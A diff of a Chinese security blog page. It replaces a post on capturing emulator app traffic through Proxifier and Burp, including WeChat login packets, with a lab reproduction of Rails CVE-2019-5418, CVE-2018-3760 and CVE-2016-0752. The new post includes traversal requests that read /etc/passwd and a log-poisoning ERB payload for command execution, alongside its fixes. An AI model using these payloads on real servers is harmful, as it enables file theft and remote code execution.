@@ -4,13 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="渗透测试 APP流量通用抓包方法, 朋与厌">
+    <meta name="keywords" content="Ruby on Rails漏洞, 朋与厌">
     <meta name="baidu-site-verification" content>
     <meta name="google-site-verification" content>
-    <meta name="description" content="渗透测试 APP流量通用抓包方法好久不见，距离上一次水文章已经两个月过去了。 非常抱歉，让大家久等了。
-
-
-毕老师之前开会的时候提起过微信、支付宝、抖音类的App会检测手机的是否挂代理，就是说不能直接在手机代理的地方做手脚，不然就会被检测到">
+    <meta name="description" content=" Ruby on Rails是一种结合Ruby语言与Rails平台的一种网页程序框架，Ruby语言以自然、简洁、快速著称，全面支持面向对象程序设计，而Rails则是Ruby广泛应用方式之一，在Rails平台上设计出一套独特的MVC开发架构，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>渗透测试 APP流量通用抓包方法 | 朋与厌Blog</title>
+    <title>Ruby on Rails漏洞 | 朋与厌Blog</title>
     <link rel="icon" type="image/png" href="/medias/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -306,13 +303,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://i.loli.net/2019/10/26/WNuODJyGAkSp2lH.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        渗透测试 APP流量通用抓包方法
+                        Ruby on Rails漏洞
                     </div>
                 </div>
             </div>
@@ -322,10 +319,99 @@
 
 
 
-<main class="container content">
+<main class="post-container content">
 
     
-    <!-- 文章内容详情 -->
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
 <div id="artDetail">
     <div class="card">
         <div class="card-content article-info">
@@ -334,8 +420,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/渗透测试/" target="_blank">
-                            <span class="chip bg-color">渗透测试</span>
+                        <a href="/tags/漏洞复现/" target="_blank">
+                            <span class="chip bg-color">漏洞复现</span>
                         </a>
                         
                     </div>
@@ -346,8 +432,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/渗透测试/" class="post-category" target="_blank">
-                            渗透测试
+                        <a href="/categories/漏洞复现/" class="post-category" target="_blank">
+                            漏洞复现
                         </a>
                         
                     </div>
@@ -358,7 +444,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-26
+                    2019-11-15
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -372,14 +458,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    838
+                    2.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    9 分
                 </div>
                 
                 
@@ -390,53 +476,95 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="渗透测试-APP流量通用抓包方法"><a href="#渗透测试-APP流量通用抓包方法" class="headerlink" title="渗透测试 APP流量通用抓包方法"></a>渗透测试 APP流量通用抓包方法</h2><p><strong>好久不见，距离上一次水文章已经两个月过去了。 非常抱歉，让大家久等了。</strong></p>
-<p><img src="https://i.loli.net/2019/10/26/io69WNfjFtHCnVs.png" alt="1572072179795.png"></p>
-<blockquote>
-<p>毕老师之前开会的时候提起过微信、支付宝、抖音类的App会检测手机的是否挂代理，就是说不能直接在手机代理的地方做手脚，不然就会被检测到  :)</p>
+                <p> Ruby on Rails是一种结合Ruby语言与Rails平台的一种网页程序框架，Ruby语言以自然、简洁、快速著称，全面支持<a href="https://zh.wikipedia.org/wiki/面向对象程序设计" target="_blank" rel="noopener">面向对象程序设计</a>，而Rails则是Ruby广泛应用方式之一，在Rails平台上设计出一套独特的<a href="https://zh.wikipedia.org/wiki/MVC" target="_blank" rel="noopener">MVC</a>开发架构，采取模型（Model）、视图（View）、控制器（Controller）分离的开发方式，不但减少了开发中的问题，更简化了许多繁复的动作。 </p>
+<h4 id="Ruby-on-Rails-路径穿越与任意文件读取漏洞（CVE-2019-5418）"><a href="#Ruby-on-Rails-路径穿越与任意文件读取漏洞（CVE-2019-5418）" class="headerlink" title="Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）"></a>Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）</h4><blockquote>
+<p>Fixed Versions:     6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1 </p>
 </blockquote>
-<h2 id="0x01-Proxifier代理介绍"><a href="#0x01-Proxifier代理介绍" class="headerlink" title="0x01 Proxifier代理介绍"></a>0x01 Proxifier代理介绍</h2><p><strong>首先介绍下Proxifier：</strong></p>
-<blockquote>
-<p>​    Proxifier是一款功能非常强大的代理客户端，支持Windows XP/Vista/Win7/Win10 和 MacOS，支持http/https、socks4/5、TCP、UDP等协议，可以指定端口，指定IP，指定域名、指定程序、指定用户名密码授权等运行模式，兼容性非常好，有点类似SOCKSCAP。</p>
-<p>​    有许多网络应用程序不支持通过代理服务器工作，不能用于局域网或防火墙后面。这些会损害公司的隐私和导致很多限制。Proxifier解决了这些问题和所有限制，让您有机会不受任何限制使用你喜爱的软件。 此外，它让你获得了额外的网络安全控制，创建代理隧道，并添加使用更多网络功能的权力。</p>
-</blockquote>
-<p>​    </p>
-<h4 id="1-2-Proxifier代理流程"><a href="#1-2-Proxifier代理流程" class="headerlink" title="1.2 Proxifier代理流程"></a>1.2 Proxifier代理流程</h4><blockquote>
-<p>翻墙 | 端口转发 </p>
-</blockquote>
-<p>代理流程主要分为两步：</p>
-<p>1、添加代理服务器（Socks5）</p>
-<p>2、设置代理规则（ 设置需要设置代理 <strong>应用程序</strong>）</p>
-<p>这时候应用程序 <strong>所有流量</strong> 经过代理服务器（实现翻墙）</p>
-<p><img src="https://i.loli.net/2019/08/18/y38JpfearHFxChE.png" alt="1566039519579.png"></p>
-<p> 这样，只要选择需要代理的应用程序，比如chrome.exe，即可实现代理流量转发 </p>
-<h2 id="0x02-设立猜想"><a href="#0x02-设立猜想" class="headerlink" title="0x02 设立猜想"></a>0x02 设立猜想</h2><p>​    梳理了流程之后，一个很骚的思路就从脑子里蹦了出来：</p>
-<p>​    代理到Socks5 流量就全部走 <strong>小飞机</strong> ，也就是说小飞机就是<strong>流量的出口</strong>。</p>
-  <div align="center"><img width="100" height="120" src="https://i.loli.net/2019/10/26/zlI2ne845CJTbjE.png"></div>  
+<p>在控制器中通过<code>render file</code>形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入<code>Accept: ../../../../../../../../etc/passwd&amp;#123;&amp;#123;</code>头来构成构造路径穿越漏洞，读取任意文件。</p>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>执行如下命令编译及启动Rail On Rails 5.2.2：</p>
+<pre><code>docker-compose build
+docker-compose up -d</code></pre><p>环境启动后，访问<code>http://your-ip:3000</code>即可看到Ruby on Rails的欢迎页面。</p>
+<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>访问<code>http://your-ip:3000/robots</code>可见，正常的robots.txt文件被读取出来。</p>
+<p>利用漏洞，发送如下数据包，读取<code>/etc/passwd</code>：</p>
+<pre><code>GET /robots HTTP/1.1
+Host: your-ip:3000
+Accept-Encoding: gzip, deflate
+Accept: ../../../../../../../../etc/passwd{{
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close</code></pre><p>成功读取：</p>
+<p><img src="https://i.loli.net/2019/11/09/mxgi5pDY2CK7VPk.png" alt="image.png"></p>
+<h4 id="Ruby-on-Rails任意文件读取-CVE-2018-3760"><a href="#Ruby-on-Rails任意文件读取-CVE-2018-3760" class="headerlink" title="Ruby on Rails任意文件读取(CVE-2018-3760)"></a>Ruby on Rails任意文件读取(CVE-2018-3760)</h4><p>Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。<br>Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。</p>
+<p>直接访问<code>http://192.168.218.131:3000/assets/file:%2f%2f/etc/passwd</code>，将会报错，因为文件/etc/passwd不在允许的目录中：<br> <img src="https://i.loli.net/2019/11/09/kcaL4H7RXWrNq5w.png" alt="img"> </p>
+<p>我们通过报错页面，可以获得允许的目录列表。随便选择其中一个目录，如/usr/src/blog/app/assets/images，然后使用%252e%252e/向上一层跳转，最后读取/etc/passwd：</p>
+<pre><code>http://192.168.218.131:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></pre><p><img src="https://i.loli.net/2019/11/09/DIC7r1WRhOAtHyE.png" alt="image.png"></p>
+<h4 id="Ruby-on-Rails-动态渲染远程代码执行漏洞-CVE-2016-0752"><a href="#Ruby-on-Rails-动态渲染远程代码执行漏洞-CVE-2016-0752" class="headerlink" title="Ruby on Rails 动态渲染远程代码执行漏洞 (CVE-2016-0752)"></a>Ruby on Rails 动态渲染远程代码执行漏洞 (CVE-2016-0752)</h4><h5 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h5><hr>
+<p>​    如果你的应用中使用了动态渲染路径 ( <code>dynamic render paths</code> ) ，如渲染<code>params[:id]</code>，通过本地文件包含（<code>local file inclusion</code>），可能会导致远程代码执行。可以通过更新到Rails的最新版本，或重构你的controllers来修复漏洞。</p>
+<p>文章主要介绍了在特定的场景下，<code>Ruby on Rails</code> 框架的一个缺陷导致攻击者能够远程执行代码。</p>
+<p>​    在 <code>Rails controllers</code> 的设计中，会根据被调用的方法，隐式的渲染对应的 <code>view</code> 文件。例如，当调用 <code>controller</code> 的 <code>show</code> 方法时，如果代码中没有明确指定要渲染的 <code>view file</code>，框架就会隐式的渲染 <code>show.html.erb</code> 文件。</p>
+<p>​    然而在很多情况下，开发者会根据请求格式，如 <code>text, JSON, XML</code> 来明确渲染的内容。此时， <code>view file</code> 是一个模板语言文件，如 <code>ERB, HAML</code> 等。<code>Rails</code> 框架中有多个方法能够用于影响和改变 <code>view</code> 内容。本文中重点关注渲染方法（<code>render method</code>）。<code>Rails</code> 的文档中给出了多种调用渲染方法的方式，包括使用 <code>file:</code> 选项来明确指定要渲染的 <code>view file</code> 路径。</p>
+<p>如果你阅读了该方法的<a href="http://guides.rubyonrails.org/layouts_and_rendering.html" target="_blank" rel="noopener">文档</a>，你会对功能的说明感到迷惑。让我们来看一段代码：</p>
+<pre><code>def show
+  render params[:template]
+end</code></pre><p>第一眼看，这段代码非常简单，该 <code>controller action</code> 的主要功能为渲染 <code>template</code> 参数指定 view 模板。但Rails如何查找指定的模板呢？在 <code>views</code> 目录下查找？ 在应用的 root 目录下查找？或是在其他位置？；该参数的值是一个模板的名称？是一个有特定后缀的文件名？或是一个完整的文件路径？这里有许许多多的疑问，我们需要查看实现的细节才能够得到答案。</p>
+<h5 id="0x01-细节说明"><a href="#0x01-细节说明" class="headerlink" title="0x01 细节说明"></a>0x01 细节说明</h5><hr>
+<p>框架的渲染机制（<code>render mechanism</code>）是一个在单一函数内试图完成太多功能的例子，这也是导致远程代码执行的原因所在。</p>
+<p>我们假定渲染机制的预期行为是渲染在 <code>app/views/user/#{params[:template]}</code> 文件，该假设看起来似乎是合理的。如果 <code>template</code> 参数的值为 <code>dashboard</code>，那么就会去加载 <code>app/views/user/dashboard.{ext}</code> 文件，其中 <code>.ext</code> 是任意允许的后缀类型，如 <code>.html, .haml, .html.erb</code> 等</p>
+<p><img src="https://i.loli.net/2019/11/15/8KuhDLxjzFdHP4I.png" alt="image.png"></p>
+<p>假设用户给出的 <code>template</code> 参数值为 <code>../admin/dashboard</code>。 程序执行的结果会是什么？ 如下图所示，执行后，程序抛出了缺少模板错误（<code>missing template error</code>）</p>
+<p><img src="https://i.loli.net/2019/11/15/zMgcvGuDYsOneaU.png" alt="image.png"></p>
+<p>通过分析报错信息，我们可以知道，框架试图在多个路径下查找要渲染的 <code>view file</code>，包括 <code>RAILS_ROOT/app/views</code>，<code>RAILS_ROOT</code> 和 文件系统的根目录。</p>
+<p>从文件系统的根目录加载并渲染文件的行为是非常危险的。如果我们将 <code>/etc/passwd</code> 作为 <code>template</code> 参数的值传入，并且能够读取到 <code>passwd</code> 文件的内容。那么将会是一个很严重的问题。</p>
+<p><img src="https://i.loli.net/2019/11/15/OA2ItnDrc9vwC3z.png" alt="image.png"></p>
+<p>如果我们能够读取 <code>passwd</code> 文件的内容，那么也可以读取应用程序的源代码和配置文件，如 <code>config/initializers/secrettoken.rb</code> 文件。</p>
+<p><img src="https://i.loli.net/2019/11/15/WlkqdOKoebQg39u.png" alt="image.png"></p>
+<p>导致该问题的原因是，在应用中使用了动态渲染路径（<code>dynamic render paths</code>）</p>
+<pre><code>def show
+  render params[:template]
+end</code></pre><p>这个简单的代码的例子证明了攻击者能够读取我们的源代码和应用程序配置文件。不幸的是，这不是最坏的结果。</p>
+<p>如 <code>Jeff Jarmo</code> 在他的文章 <a href="http://matasano.com/research/AnatomyOfRailsVuln-CVE-2014-0130.pdf" target="_blank" rel="noopener">The Anatomy of a Rails Vulnerability – CVE-2014-0130: From Directory Traversal to Shell</a> 中描述的，我们能够利用这个漏洞获得一个shell。<code>Jeff</code> 的文章中描述了 在某些版本的Rails的 隐式渲染机制的一个相似漏洞，能够允许目录遍历（<code>directory traversal</code>），更精确的说，本地文件包含（<code>local file inclusion</code>）。本文中重点关注显示渲染（<code>explicit rendering</code>），这是一个由框架开发者所引入的漏洞。</p>
+<p>在进入细节分析前，这里将该漏洞的分类归为文件包含而不是目录遍历，原因是我们将文件作为代码（<code>ERB</code>）进行加载、解释并执行。从传统意义上来说，目录遍历漏洞返回的是不可执行的（<code>non-executable</code>）的内容，如 <code>CSV</code> 文件。因此从本质来说，我们不仅仅能够读取应用程序的源代码和其他可读的系统文件，还能够执行 <code>Ruby</code> 代码。既然我们能够执行 <code>Ruby</code> 代码，我们也能够在 <code>web server</code> 上执行系统级别（<code>system-level</code>）的命令。</p>
+<p>在从文件包含到得到 <code>shell</code> 的过程中，用到了一种关键的技术，称为 日志文件污染 (<code>log file tainting</code>)。<code>Rails</code> 在运行过程中，会将请求信息记录到日志文件中，包括请求参数，如 <code>development.log</code> 。日志文件是纯文本格式，能够包含 <code>Ruby</code> 代码。日志文件污染可以通过向 <code>web</code> 应用程序发送一个恶意的请求，请求的参数中包含有效的 <code>Ruby</code> 代码来实现。</p>
+<p>在下面的例子中，我们向<code>web</code> 应用程序发起了一个合法的请求，但在 <code>URL</code> 中带上了包含恶意的、经过 <code>URL</code> 编码的参数 &lt;%= `ls` %&gt;。</p>
+<p><img src="https://i.loli.net/2019/11/15/GZ7mrkiT9XfpCMq.png" alt="image.png"></p>
+<p>通过查看日志文件，我们可以看到，日志中请求参数是以 <code>hash</code> 键值对的方式保存，并进行了 URL解码。这是有效的 <code>Ruby</code> 代码，能够在文件被渲染时执行。</p>
+<p><img src="https://i.loli.net/2019/11/15/RVqOvXLljgkrBta.png" alt="image.png"></p>
+<p>因此，我们能够利用文件包含漏洞来尝试加载日志文件，执行包含的 <code>Ruby</code> 代码。</p>
+<p><img src="https://i.loli.net/2019/11/15/RSKtzFOCLlXQd6w.png" alt="image.png"></p>
+<p>当日志文件返回时，我们能够看到参数的 <code>hash</code> 值。之前包含我们 <code>payload</code> 的部分已经被 <code>ls</code> 命令的执行结果所替换。到这里，我们已经能够以 <code>web-server</code> 对应用户权限来执行系统命令了。</p>
+<h5 id="0x02-修复方法-amp-缓解措施"><a href="#0x02-修复方法-amp-缓解措施" class="headerlink" title="0x02 修复方法 &amp; 缓解措施"></a>0x02 修复方法 &amp; 缓解措施</h5><hr>
+<p>安装 <code>Rails</code> 特定版本的 <a href="https://groups.google.com/forum/#!topic/rubyonrails-security/335P1DcLG00" target="_blank" rel="noopener">补丁</a></p>
+<p>如果还没有安装 <code>patch</code>，可以考虑禁止渲染白名单之外的文件。具体方法为，在 <code>action</code> 中定义允许的文件名白名单 <code>hash</code>，对用户的参数进行校验，确保参数在文件白名单 <code>hash</code> 中。这种方法需要在应用程序中所有使用到动态渲染路径的地方都增加校验。</p>
+<pre><code>def show
+  template = params[:id]
 
-<p> 注意到<strong>添加代理服务器协议处有一个HTTPS的代理方式</strong> Burp也是通过代理进行收发流量的。</p>
-<p>这样就跟浏览器挂代理抓包原理是一样的。</p>
-<p><strong>猜想建立</strong> -&gt; 用代理转发工具将流量出口代理到Burp 8080端口  </p>
-<p>​                     -&gt; 注入流量（<strong>模拟器有很多进程，其中有个进程是网络的进程</strong>）</p>
-<p> 安卓模拟器大多是使用virtualbox的虚拟网卡进行的网络通信，那么，如果直接将模拟器的网络进程的所有流量代理到burpsite即可抓取流量包，同时又绕过了关于客户端的相关校验。 </p>
-<p> 打开模拟器分析网络进程，会发现模拟器使用的网络进程有：<code>virtualbox headless fronrend</code>和<code>NoxVMHandle Frontend</code>。 </p>
-<p><img src="https://i.loli.net/2019/08/18/6yRk7JtQTKaDpns.png" alt="1566036600076.png"></p>
-<p>总体流程图如下：</p>
-<p><img src="https://i.loli.net/2019/08/18/VyMN7CgBmspZ4PR.png" alt="image.png"></p>
-<h2 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a>验证猜想</h2><h3 id="2-1-设置Proxifier代理服务器"><a href="#2-1-设置Proxifier代理服务器" class="headerlink" title="2.1 设置Proxifier代理服务器"></a>2.1 设置Proxifier代理服务器</h3><p>代理服务器设置为burp监听端口。</p>
-<p><img src="https://i.loli.net/2019/10/26/hyzJKiCj6217eNs.png" alt="1572071477649.png"></p>
-<h3 id="2-2-设置代理规则"><a href="#2-2-设置代理规则" class="headerlink" title="2.2 设置代理规则"></a>2.2 设置代理规则</h3><p>将<code>NoxVMHandle Frontend</code>进程对应的应用程序文件加入代理规则。</p>
-<p><img src="https://i.loli.net/2019/10/26/myaVUqeWZvJkjfd.png" alt="1572071517431.png"></p>
-<h3 id="2-3-安装证书"><a href="#2-3-安装证书" class="headerlink" title="2.3 安装证书"></a><strong>2.3 安装证书</strong></h3><p>这里不再详细讲。 </p>
-<p>虚拟机都是用的虚拟网卡 不能直接访问到宿主机</p>
-<p><img src="https://i.loli.net/2019/08/18/8ZcpQOV9B2HUCnd.png" alt="1566045141291.png"></p>
-<p>将Burp的CA证书文件复制到模拟器安装就可以了</p>
-<h3 id="2-4-抓取流量包"><a href="#2-4-抓取流量包" class="headerlink" title="2.4 抓取流量包"></a>2.4 抓取流量包</h3><p> 配置之后，即可在proxifier中获取到模拟器内对应app的流量 </p>
-<p>这样模拟器的流量就全部走向Burp了 </p>
-<p><img src="https://i.loli.net/2019/08/18/ufnMjyZVIN9tFiW.png" alt="1566045307683.png"></p>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>微信登录数据包</p>
-<p><img src="https://i.loli.net/2019/08/18/S2ygPmRKVMltanC.png" alt="1566045296943.png"></p>
-<p><img src="https://i.loli.net/2019/08/18/gZwlNuF9WtfzYqK.png" alt="1566046032964.png"></p>
+  valid_templates = {
+    &quot;dashboard&quot; =&gt; &quot;dashboard&quot;,
+    &quot;profile&quot;   =&gt; &quot;profile&quot;,
+    &quot;deals&quot;   =&gt; &quot;deals&quot;
+  }
+
+  if valid_templates.include?(template)
+    render &quot; #{valid_templates[template]}&quot;
+  else
+    # throw exception or 404
+  end
+end</code></pre><p>另一种类似的方法为校验给定的文件是否在特定的目录下存在。</p>
+<pre><code>def show
+  template = params[:id]
+  d = Dir[&quot;myfolder/*.erb&quot;]
+
+  if d.include?(&quot;myfolder/#{template}.erb&quot;)
+    render &quot;myfolder/#{template}&quot;
+  else
+    # throw exception or 404
+  end
+end</code></pre><p>此外，我们可以使用 <code>Rails</code> 静态分析工具 <a href="http://brakemanscanner.org/" target="_blank" rel="noopener">Brakeman</a>来扫描应用程序。<code>Brakeman</code> 检测报告会给出使用了动态渲染路径的 <code>controllers</code>，可以根据此来分析哪些 <code>controllers</code> 会有远程代码执行的风险。</p>
+<p>Referer</p>
+<p><a href="https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752/" target="_blank" rel="noopener">https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752/</a></p>
+<p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p>
+<p><a href="https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q" target="_blank" rel="noopener">https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q</a></p>
+<p><a href="https://xz.aliyun.com/t/4448" target="_blank" rel="noopener">https://xz.aliyun.com/t/4448</a></p>
 
             </div>
             <hr />
@@ -596,9 +724,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《渗透测试 APP流量通用抓包方法》
+                    《Ruby on Rails漏洞》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/10/26/app-traffic-general-packet-capture-method/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/15/rubyonrails/" property="cc:attributionName"
                rel="cc:attributionURL">
                 朋与厌
             </a> 采用
@@ -639,7 +767,7 @@
         repo: 'P1Kaju.github.io',
         owner: 'P1Kaju',
         admin: "P1Kaju",
-        id: '2019/10/26/app-traffic-general-packet-capture-method/',
+        id: '2019/11/15/rubyonrails/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -660,29 +788,30 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/11/01/thinkcmfx/">
+                <a href="/2019/11/15/rubyonrails/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="ThinkCMFX 漏洞分析集合">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Ruby on Rails漏洞">
                         
-                        <span class="card-title">ThinkCMFX 漏洞分析集合</span>
+                        <span class="card-title">Ruby on Rails漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ThinkCMF 有两个版本 V版本和X版本  ThinkCMF V 基于ThinkPHP3 开发官方已经不再维护。 本文将对 **ThinkCMFX**  2.2.3 进行漏洞总结分析。 **ThinkCMFX2.2.3** 下载地址： https://github.com/thinkcmf/
+                            Ruby on Rails是一种结合Ruby语言与Rails平台的一种网页程序框架，Ruby on Rails几个高危漏洞分析。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -695,6 +824,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -713,30 +843,30 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/09/15/steam/">
+                <a href="/2019/11/01/solr/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Steam Windows客户端本地提权0day">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Ahache Solr velocity模板命令执行漏洞">
                         
-                        <span class="card-title">Steam Windows客户端本地提权0day</span>
+                        <span class="card-title">Ahache Solr velocity模板命令执行漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            适用于Windows系统流行得Steam游戏客户端存在提权0Day漏洞，该漏洞可允许具有低权限攻击者以管理员身份运行程序
+                            国外安全研究员 s00py 在 Twitter 公开了 Apache Solr Velocity 模版注入远程命令执行的 EXP
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-15
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-01
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/系统漏洞/" class="post-category" target="_blank">
-                                    系统漏洞
+                            <a href="/categories/漏洞复现/" class="post-category" target="_blank">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -746,8 +876,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/系统漏洞/" target="_blank">
-                        <span class="chip bg-color">系统漏洞</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -797,6 +927,99 @@
     });
 </script>
 
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
